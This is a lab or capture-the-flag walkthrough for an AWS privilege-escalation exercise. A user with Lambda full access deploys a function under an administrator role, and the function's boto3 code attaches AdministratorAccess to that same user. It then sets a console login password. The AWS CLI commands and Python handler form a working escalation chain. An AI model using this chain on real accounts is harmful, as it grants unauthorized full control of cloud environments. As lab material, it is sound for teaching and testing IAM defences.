# Solutions / Walk through

Lets start off by viewing what permissions are attached to our user.

Run the following commands while authenticated as demo.

```sh
aws iam list-attached-user-policies --user-name demo

aws iam list-user-policies --user-name demo
```

The first command lists existing policies managed by aws and your account. While the seconds lists inline policies that only exist for the object they are attached too.

It looks like we have full lambda permissions: `arn:aws:iam::aws:policy/AWSLambda_FullAccess`

Lets see what roles exist that we can use on our lambda.

```sh
aws iam list-roles
```

It seems that there is a role that we can use: `Administrative`

```sh
aws iam get-role --role-name Administrative

aws iam list-attached-role-policies --role-name Administrative
```

The roles has administrator permissions and can be used on lambda functions, lets pivot from this.

```json
"AssumeRolePolicyDocument": {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "",
            "Effect": "Allow",
            "Principal": {
                "Service": "lambda.amazonaws.com"
            },
            "Action": "sts:AssumeRole"
        }
    ]
},
```

Lets create a lambda a lambda function and use the role that have admin.

Put the following code into a file (*main.py*).

```py
import boto3

def lambda_handler(event, lambda_context):
    iam = boto3.resource('iam')
    user = iam.User('demo')
    response = user.attach_policy( PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess' )
    print(response)
```

Replace ***0123456789*** with your account id from the terraform output.

```sh
vim main.py

zip -u code.zip main.py

aws lambda create-function --function-name demo --runtime python3.9 --role arn:aws:iam::0123456789:role/Administrative --zip-file fileb://code.zip --handler main.lambda_handler
```

Lets now invoke the function to update our permissions.

```sh
aws lambda invoke --function-name demo file.out
```

We can now attach admin permissions to the demo user.

```sh
aws iam list-attached-user-policies --user-name demo
```

The demo user now has administrator permissions in this aws account. ◻

## Cleanup

Lets remove what we created and then let terraform do the rest.

```sh
aws lambda delete-function --function-name demo

aws iam detach-user-policy --user-name demo --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

rm main.py code.zip file.out
```

## AWS Console

All of the following can be done in the web console as well.

Run the following command.

```sh
aws iam create-login-profile --user-name demo --password 'My!User1Login8P@ssword'
```

Navigate to [console.aws.amazon.com](console.aws.amazon.com) choose IAM login, account id is in the terraform output [*account_id*], username is **demo** and password is **My!User1Login8P@ssword**
